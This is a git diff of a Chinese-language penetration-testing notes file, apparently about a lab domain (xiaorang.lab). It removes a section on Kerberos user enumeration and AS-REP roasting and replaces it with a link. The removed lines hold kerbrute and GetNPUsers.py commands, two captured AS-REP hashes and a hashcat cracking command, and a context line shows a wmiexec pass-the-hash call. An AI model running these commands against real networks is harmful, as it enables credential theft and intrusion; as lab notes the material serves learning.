@@ -378,31 +378,7 @@ python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd93596983261
 ```
 
 ### 域用户枚举\_爆破 Kerberos
-
-[爆破 Kerberos](http://www.fzwjscj.xyz/index.php/archives/51/)
-
-```sh
-# 域用户枚举  https://github.com/ropnop/kerbrute
-./kerbrute_linux_amd64 userenum --dc 172.22.6.12 -d xiaorang.lab user_name.txt -t 10
-```
-
-- AS-REPRoasting
-  对于域用户，如果设置了选项 Do not require Kerberos preauthentication(不要求 Kerberos 预身份认证)，此时向域控制器的 88 端口发送 AS-REQ 请求，对收到的 AS-REP 内容重新组合，能够拼接成"Kerberos 5 AS-REP etype 23"(18200)的格式，接下来可以使用 hashcat 或是 john 对其破解，最终获得该用户的明文口令
-
-```sh
-# 查找未设置预认证的账号
-proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/
-```
-
-得到两个账号 wenshao@xiaorang.lab 、zhangxin@xiaorang.lab
-
-```sh
-$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:b6c410706b5e96c693b2fc61ee1064c3$2dc9fbee784e7997333f30c6bc4298ab5752ba94be7022e807af418c11359fd92597e253752f4e61d2d18a83f19b5c9df4761e485853a3d879bcf7a270d6f846683b811a80dda3809528190d7f058a24996aff13094ff9b32c0e2698f6d639b4d237a06d13c309ce7ab428656b79e582609240b01fb5cd47c91573f80f846dc483a113a86977486cecce78c03860050a81ee19921d3500f36ff39fa77edd9d5614cf4b9087d3e42caef68313d1bb0c4f6bc5392943557b584521b305f61e418eb0f6eb3bf339404892da55134cb4bf828ac318fe00d68d1778b7c82caf03b65f1938e54ed3fa51b63cdb2994
-$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:971802b84ce99050ad3c5f49d11fd0b7$6c1be075c3cf2a7695529de2ebbf39c5ec7e5326c9d891dac2107b239892f76befe52c860e4e1e2ff6537a5765a6bcb6b8baca792d60765ac0bbe1b3c5e59f3ec51b7426636a437d5df12130eb68d9b17ef431455415671c7331a17ce823e28cc411677bed341d3fceefc3451b8b232ea6039661625a5c793e30c4d149b2ed9d2926e9d825b3828744ebce69e47746994c9a749ceeb76c560a1840bc74d2b9f301bb5b870c680591516354460dab2238e7827900ed80320dd3a6f46874b1bc8a3a68aea7bd11d0683ec94103f59d9511691090928e98d0d8978f511e71fd9db0067fa0d450c120f3726918d7
-
-# 使用hashcat解密
-hashcat -m 18200 --force -a 0 '$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:b6c410706b5e96c693b2fc61ee1064c3$2dc9fbee784e7997333f30c6bc4298ab5752ba94be7022e807af418c11359fd92597e253752f4e61d2d18a83f19b5c9df4761e485853a3d879bcf7a270d6f846683b811a80dda3809528190d7f058a24996aff13094ff9b32c0e2698f6d639b4d237a06d13c309ce7ab428656b79e582609240b01fb5cd47c91573f80f846dc483a113a86977486cecce78c03860050a81ee19921d3500f36ff39fa77edd9d5614cf4b9087d3e42caef68313d1bb0c4f6bc5392943557b584521b305f61e418eb0f6eb3bf339404892da55134cb4bf828ac318fe00d68d1778b7c82caf03b65f1938e54ed3fa51b63cdb2994' rockyou.txt
-```
+[域用户枚举\_爆破 Kerberos](domain/domain_03_%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE_%E7%88%86%E7%A0%B4%20Kerberos.md)
 
 ## Tool
 
